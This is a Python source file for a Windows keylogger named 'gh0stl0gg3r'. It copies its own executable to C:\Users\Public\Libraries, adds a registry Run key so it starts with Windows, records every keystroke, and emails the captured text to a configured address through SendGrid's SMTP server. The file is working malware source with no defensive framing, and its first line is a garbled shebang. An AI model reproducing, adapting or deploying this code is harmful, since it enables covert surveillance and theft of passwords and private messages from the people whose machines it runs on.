#!/usr/bin/py#!/usr/bin/python3
# -*- coding: utf-8 -*-

#standard library imports
import sys
import shutil
import smtplib
import datetime
import subprocess
from os import path
from time import sleep
from threading import Thread
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# third party imports
from pynput.keyboard import Key, Listener


class L0gg3r:
    def __init__(self, email, key, id):
        self.email = email
        self.key = key
        self.id = id
        self.data = ''
        self.dir = 'C:\\Users\\Public\\Libraries\\gh0stl0gg3r.exe'

    def persist(self):
        shutil.copyfile(sys.executable, self.dir)
        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v gh0stl0gg3r /t REG_SZ /d "' + str(self.dir) + '"', shell=True)

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == Key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.data = self.data + current_key

    def send_mail(self):
        while True:
            if len(self.data) > 50:
                time = datetime.datetime.now()
                msg = MIMEMultipart()
                msg['From'] = self.email
                msg['To'] = self.email
                msg['Subject'] = 'Report from {1}'.format(str(time), str(self.id))
                body = self.data
                msg.attach(MIMEText(body, 'plain'))
                try:
                    server = smtplib.SMTP('smtp.sendgrid.net', 587)
                    server.starttls()
                    server.login('apikey', self.key)
                    server.sendmail(self.email, self.email, msg.as_string())
                    server.quit()
                    self.data = ''
                except:
                    sleep(120)
            else:
                sleep(120)

    def start(self):
        if not path.isfile(self.dir):
            self.persist()
        triggerThread = Thread(target=self.send_mail)
        triggerThread.start()
        with Listener(on_press=self.process_key_press) as listener:
            listener.join()
